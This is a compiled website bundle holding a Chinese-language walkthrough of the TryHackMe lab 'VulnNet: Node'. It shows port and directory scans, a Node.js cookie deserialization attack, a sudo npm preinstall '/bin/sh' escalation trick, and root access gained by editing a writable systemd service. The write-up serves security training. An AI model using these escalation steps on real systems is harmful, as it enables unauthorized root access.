"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[9464],{85725:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>d,frontMatter:()=>a,metadata:()=>o,toc:()=>c});var s=t(74848),r=t(28453);const a={sidebar_position:71,tags:["Easy","Linux","\u53cd\u5e8f\u5217\u5316","NodeJs","SUDO","service"],title:"VulnNet: Node",description:"VulnNet: Node",sidebar_label:"VulnNet: Node",slug:"/tryhackme/71"},i="VulnNet: Node",o={id:"box/TryHackMe/71",title:"VulnNet: Node",description:"VulnNet: Node",source:"@site/docs/box/TryHackMe/71.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/71",permalink:"/docs/tryhackme/71",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u53cd\u5e8f\u5217\u5316",permalink:"/docs/tags/\u53cd\u5e8f\u5217\u5316"},{label:"NodeJs",permalink:"/docs/tags/node-js"},{label:"SUDO",permalink:"/docs/tags/sudo"},{label:"service",permalink:"/docs/tags/service"}],version:"current",sidebarPosition:71,frontMatter:{sidebar_position:71,tags:["Easy","Linux","\u53cd\u5e8f\u5217\u5316","NodeJs","SUDO","service"],title:"VulnNet: Node",description:"VulnNet: Node",sidebar_label:"VulnNet: Node",slug:"/tryhackme/71"},sidebar:"boxSidebar",previous:{title:"magician",permalink:"/docs/tryhackme/70"},next:{title:"Epoch",permalink:"/docs/tryhackme/72"}},l={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"8080",id:"8080",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www",id:"www",level:3},{value:"www \u2014&gt; serv-manage",id:"www--serv-manage",level:3},{value:"serv-manage \u2014&gt; root",id:"serv-manage--root",level:3}];function m(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",strong:"strong",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"vulnnet-node",children:"VulnNet: Node"}),"\n",(0,s.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-208-99:~/vulnnetnode# nmap -sTCV -p 8080 --min-rate 1000 10.10.78.101\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-06 01:12 BST\nNmap scan report for ip-10-10-78-101.eu-west-1.compute.internal (10.10.78.101)\nHost is up (0.000094s latency).\n\nPORT     STATE SERVICE VERSION\n8080/tcp open  http    Node.js Express framework\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!\nMAC Address: 02:2D:05:35:9D:E9 (Unknown)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n"})}),"\n",(0,s.jsx)(n.h2,{id:"8080",children:"8080"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-208-99:~/vulnnetnode# gobuster dir -u http://10.10.78.101:8080/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.78.101:8080/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/09/06 01:16:27 Starting gobuster\n===============================================================\n/img (Status: 301)\n/login (Status: 200)\n/css (Status: 301)\n/Login (Status: 200)\n/IMG (Status: 301)\n/CSS (Status: 301)\n/Img (Status: 301)\n/LogIn (Status: 200)\n/LOGIN (Status: 200)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u8bbf\u95ee\u6b64\u7ad9\u70b9, \u5728\u9996\u9875\u5e16\u5b50\u4e2d, \u63d0\u5230\u5173\u4e8e Node JS \u7684\u6f0f\u6d1e,  \u90a3\u4e48\u8fd9\u4e2a\u670d\u52a1\u5668\u5bf9\u5e94\u7684\u5e94\u8be5\u5c31\u662f Node JS, \u540c\u65f6\u6211\u53d1\u73b0\u4e00\u4e2a\u767b\u9646\u7a97\u53e3, \u6211\u5728\u6b64\u5ba1\u9605\u4e00\u756a\u540e, \u5e76\u6ca1\u6709\u53d1\u73b0\u4fe1\u606f\u6cc4\u9732\u7b49\u6f0f\u6d1e, \u6293\u5305\u67e5\u770b, \u6211\u53d1\u73b0\u5176 Cookie \u6784\u9020\u5f88\u6709\u610f\u601d, \u672c\u6765\u6211\u60f3\u7684\u662f\u57fa\u4e8e Cookie \u7684\u7528\u6237\u5224\u65ad, \u4f46\u662f\u5c1d\u8bd5\u4e00\u756a\u540e\u65e0\u679c, \u5728\u67e5\u770b WP\u540e, \u53d1\u73b0\u662f\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e ",(0,s.jsx)(n.a,{href:"https://exploit-notes.hdks.org/exploit/web/security-risk/nodejs-deserialization-attack/",children:"Node.js Deserialization Attack"})]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703191326.png",alt:"20240703191326"})}),"\n",(0,s.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(n.h3,{id:"www",children:"www"}),"\n",(0,s.jsx)(n.p,{children:"\u5229\u7528\u4e0a\u9762\u7684\u65b9\u6cd5\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316 payload \u76f4\u63a5\u4f7f\u7528\u5373\u53ef"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703191636.png",alt:"20240703191636"})}),"\n",(0,s.jsx)(n.h3,{id:"www--serv-manage",children:"www \u2014> serv-manage"}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u53d1\u73b0\u7528\u6237 www \u5177\u6709 serv-manage \u7684 SUDO \u7279\u6743"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703191648.png",alt:"20240703191648"})}),"\n",(0,s.jsxs)(n.p,{children:["\u7ecf\u8fc7\u67e5\u627e\u53d1\u73b0\u4e86\u5176\u5229\u7528\u65b9\u5f0f ",(0,s.jsx)(n.a,{href:"https://gtfobins.github.io/gtfobins/npm/#sudo",children:"npm#sudo"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'(remote) www@vulnnet-node:/home$ TF=$(mktemp -d)\n(remote) www@vulnnet-node:/home$ echo \'{"scripts": {"preinstall": "/bin/sh"}}\' > $TF/package.json\n(remote) www@vulnnet-node:/tmp/tmp.ZOynUEzgbh$ chmod 777 package.json \n(remote) www@vulnnet-node:/tmp$ chmod 777 tmp.ZOynUEzgbh/\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703191727.png",alt:"20240703191727"})}),"\n",(0,s.jsx)(n.h3,{id:"serv-manage--root",children:"serv-manage \u2014> root"}),"\n",(0,s.jsxs)(n.p,{children:["\u63a5\u7740\u6211\u53d1\u73b0\u7528\u6237 serv-manage \u5177\u6709 root \u7528\u6237\u7684 ",(0,s.jsx)(n.a,{href:"https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers",children:"sudo \u7279\u6743"})]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703191811.png",alt:"20240703191811"})}),"\n",(0,s.jsx)(n.p,{children:"\u53c2\u7167\u4e0a\u9762\u7684\u6559\u7a0b\u6211\u8fdb\u884c\u4e86\u5229\u7528"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"\\[\\](remote)\\[\\] \\[\\]serv-manage@vulnnet-node\\[\\]:\\[\\]/tmp/tmp.ZOynUEzgbh\\[\\]$ locate vulnnet-auto.timer\n/etc/systemd/system/vulnnet-auto.timer\n\\[\\](remote)\\[\\] \\[\\]serv-manage@vulnnet-node\\[\\]:\\[\\]/tmp/tmp.ZOynUEzgbh\\[\\]$ ls -al /etc/systemd/system/vulnnet-auto.timer\n-rw-rw-r-- 1 root serv-manage 167 Jan 24  2021 /etc/systemd/system/vulnnet-auto.timer\n\\[\\](remote)\\[\\] \\[\\]serv-manage@vulnnet-node\\[\\]:\\[\\]/tmp/tmp.ZOynUEzgbh\\[\\]$ cat /etc/systemd/system/vulnnet-auto.timer\n[Unit]\nDescription=Run VulnNet utilities every 30 min\n\n[Timer]\nOnBootSec=0min\n# 30 min job\nOnCalendar=*:0/30\n**Unit=vulnnet-job.service**\n\n[Install]\nWantedBy=basic.target\n\\[\\](remote)\\[\\] \\[\\]serv-manage@vulnnet-node\\[\\]:\\[\\]/tmp/tmp.ZOynUEzgbh\\[\\]$ locate vulnnet-job.service\n/etc/systemd/system/vulnnet-job.service\n\\[\\](remote)\\[\\] \\[\\]serv-manage@vulnnet-node\\[\\]:\\[\\]/tmp/tmp.ZOynUEzgbh\\[\\]$ ls -al /etc/systemd/system/vulnnet-job.service\n-rw-rw-r-- 1 root serv-manage 197 Jan 24  2021 /etc/systemd/system/vulnnet-job.service\n\\[\\](remote)\\[\\] \\[\\]serv-manage@vulnnet-node\\[\\]:\\[\\]/tmp/tmp.ZOynUEzgbh\\[\\]$ cat /etc/systemd/system/vulnnet-job.service\n[Unit]\nDescription=Logs system statistics to the systemd journal\nWants=vulnnet-auto.timer\n\n[Service]\n# Gather system statistics\nType=forking\n**ExecStart=/bin/df**\n\n[Install]\nWantedBy=multi-user.target\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u53d1\u73b0\u6ee1\u8db3\u53ef\u5229\u7528\u7684\u6761\u4ef6, \u901a\u8fc7\u4fee\u6539 ",(0,s.jsx)(n.strong,{children:"vulnnet-job.service"})," \u6587\u4ef6\u5185\u5bb9\u8fdb\u884c\u5229\u7528\u5373\u53ef"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703191848.png",alt:"20240703191848"})})]})}function d(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(m,{...e})}):m(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>o});var s=t(96540);const r={},a=s.createContext(r);function i(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);